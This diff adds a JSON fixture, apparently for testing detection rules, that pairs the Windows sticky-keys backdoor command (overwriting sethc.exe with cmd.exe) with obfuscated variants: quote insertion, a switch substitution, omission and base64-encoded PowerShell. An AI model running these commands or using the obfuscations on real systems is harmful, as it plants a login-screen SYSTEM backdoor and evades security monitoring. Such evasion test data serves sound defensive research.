@@ -1,0 +1,11 @@
+{
+  "rule_name": "proc_creation_win_cmd_sticky_keys_replace_0",
+  "original_command": "copy /y C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe",
+  "evasions": {
+    "insertion": "copy /y C:\\windows\\system32\\cmd.exe \"C\"\":\"\"\\\"\"w\"\"i\"\"n\"\"d\"\"o\"\"w\"\"s\"\"\\\"\"s\"\"y\"\"s\"\"t\"\"e\"\"m\"\"3\"\"2\"\"\\\"\"s\"\"e\"\"t\"\"h\"\"c\"\".\"\"e\"\"x\"\"e\"",
+    "substitution": "copy -y C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe",
+    "omission": "copy /y cmd sethc",
+    "reordering": "copy /y C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe",
+    "recoding": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAveSBDOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUgQzpcd2luZG93c1xzeXN0ZW0zMlxzZXRoYy5leGU=')) | Invoke-Expression\" "
+  }
+}
